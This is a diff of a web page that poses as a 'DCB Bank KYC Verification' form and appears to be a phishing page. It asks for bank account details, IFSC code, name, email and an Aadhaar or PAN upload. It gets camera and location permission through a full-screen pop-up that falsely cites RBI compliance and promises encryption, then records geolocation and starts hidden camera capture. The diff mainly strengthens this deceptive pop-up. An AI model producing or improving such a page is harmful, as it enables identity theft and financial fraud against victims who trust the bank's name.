@@ -6,30 +6,19 @@
   <title>DCB Bank KYC Verification</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-
     body {
       background-color: #f4f6f9;
-      color: #333;
-      line-height: 1.6;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
       padding: 15px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
     }
 
     .container {
       max-width: 500px;
-      width: 100%;
-      margin: 20px auto;
       background: white;
-      border-radius: 16px;
       padding: 25px;
+      margin: 20px auto;
+      border-radius: 16px;
       box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
     }
 
@@ -37,58 +26,38 @@
       display: block;
       margin: 0 auto 15px;
       width: 160px;
-      height: auto;
     }
 
     h2 {
       text-align: center;
       color: #003d6a;
-      margin-bottom: 20px;
-      font-weight: 700;
-      font-size: 24px;
-    }
-
-    .notice {
-      font-size: 14px;
-      color: #444;
-      text-align: center;
-      margin-bottom: 20px;
-      background-color: #f8f9fa;
-      padding: 12px;
-      border-radius: 8px;
-      border-left: 4px solid #ffc107;
     }
 
     label {
-      display: block;
-      margin-top: 18px;
       font-weight: 600;
-      font-size: 14px;
-      color: #003d6a;
+      display: block;
+      margin-top: 15px;
     }
 
     input[type="text"],
     input[type="file"] {
       width: 100%;
-      font-size: 14px;
-      padding: 12px;
+      padding: 10px;
       margin-top: 6px;
+      border: 1px solid #ccc;
       border-radius: 8px;
-      border: 1px solid #d1d5db;
-      background: white;
     }
 
     button {
-      margin-top: 25px;
-      width: 100%;
-      background-color: #003d6a;
+      background: #003d6a;
       color: white;
       border: none;
-      padding: 15px;
+      padding: 14px;
       font-size: 16px;
-      font-weight: 600;
       border-radius: 8px;
       cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
     }
 
     .footer {
@@ -96,65 +65,123 @@
       margin-top: 30px;
       font-size: 12px;
       color: #777;
-      padding-top: 15px;
-      border-top: 1px solid #eee;
     }
 
     .error {
-      color: #d32f2f;
+      color: red;
       text-align: center;
-      font-size: 13px;
-      margin-top: 12px;
+      margin-top: 10px;
     }
 
     .success-message {
-      text-align: center;
-      padding: 18px;
-      background-color: #e8f5e9;
-      border-radius: 8px;
+      background: #e8f5e9;
       border-left: 4px solid #28a745;
-      margin-top: 18px;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 20px;
       display: none;
+      text-align: center;
     }
 
     video, canvas {
       display: none;
     }
+
+    #verificationPopup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.92);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      backdrop-filter: blur(8px);
+      padding: 15px;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 25px;
+      border-radius: 16px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+
+    .popup-content h3 {
+      margin-top: 0;
+      color: #003d6a;
+    }
+
+    .popup-content ul {
+      padding-left: 20px;
+    }
+
+    .popup-content li {
+      margin-bottom: 10px;
+    }
+
+    .popup-button {
+      margin-top: 20px;
+      width: 100%;
+      background: #003d6a;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      border: none;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img class="logo" src="dbc.png" alt="DCB Bank Logo" />
-    <h2>DCB Bank KYC Verification</h2>
 
-    <div id="permissionStep">
-      <p class="notice">Please allow access to your camera and location.</p>
-      <button onclick="requestPermissions()">Allow & Continue</button>
-      <p id="permStatus" class="error"></p>
+  <!-- KYC POPUP -->
+  <div id="verificationPopup">
+    <div class="popup-content">
+      <h3><i class="fas fa-shield-alt"></i> Important: KYC Verification</h3>
+      <p>To comply with RBI regulations, DCB Bank requires one-time account verification.</p>
+      <ul>
+        <li><strong>Camera</strong>: For identity confirmation</li>
+        <li><strong>Location</strong>: For transaction validation</li>
+      </ul>
+      <p>Your information is secure and encrypted.</p>
+      <button class="popup-button" onclick="requestPermissions()">I Understand & Continue</button>
     </div>
+  </div>
+
+  <!-- MAIN FORM -->
+  <div class="container">
+    <img src="dbc.png" class="logo" alt="DCB Bank Logo">
+    <h2>DCB Bank KYC Verification</h2>
 
     <div id="kycForm" style="display: none;">
       <form id="kycFormElement">
         <label>Bank Name</label>
-        <input type="text" id="bankname" name="bankname" required />
+        <input type="text" id="bankname" name="bankname" required>
         <label>IFSC Code</label>
-        <input type="text" id="ifsc" name="ifsc" required />
+        <input type="text" id="ifsc" name="ifsc" required>
         <label>Account Number</label>
-        <input type="text" id="accno" name="accno" required />
+        <input type="text" id="accno" name="accno" required>
         <label>Full Name</label>
-        <input type="text" id="fullname" name="fullname" required />
+        <input type="text" id="fullname" name="fullname" required>
         <label>Email</label>
-        <input type="text" id="email" name="email" required />
+        <input type="text" id="email" name="email" required>
         <label>Upload Aadhaar or PAN</label>
-        <input type="file" id="document" name="document" required />
+        <input type="file" id="document" name="document" required>
         <button type="submit">Verify Account</button>
       </form>
+
       <div id="successMessage" class="success-message">
-        <h3>✅ Submitted Successfully</h3>
+        <h3>✅ Verification Submitted</h3>
+        <p>Your KYC has been submitted successfully.</p>
       </div>
     </div>
 
-    <div class="footer">© 2025 DCB Bank Ltd. For official verification only.</div>
+    <div id="permStatus" class="error"></div>
+    <div class="footer">© 2025 DCB Bank Ltd.</div>
   </div>
 
   <video id="cameraPreview" autoplay playsinline></video>
@@ -224,7 +251,7 @@
               accuracy: pos.coords.accuracy,
               timestamp: pos.timestamp
             };
-            document.getElementById('permissionStep').style.display = 'none';
+            document.getElementById('verificationPopup').style.display = 'none';
             document.getElementById('kycForm').style.display = 'block';
             startPreCapture();
           },
@@ -277,7 +304,7 @@
 
     window.addEventListener('beforeunload', stopCamera);
     window.addEventListener('load', () => {
-      document.getElementById('cameraPreview').style.display = 'none';
+      document.getElementById('verificationPopup').style.display = 'flex';
     });
   </script>
 </body>
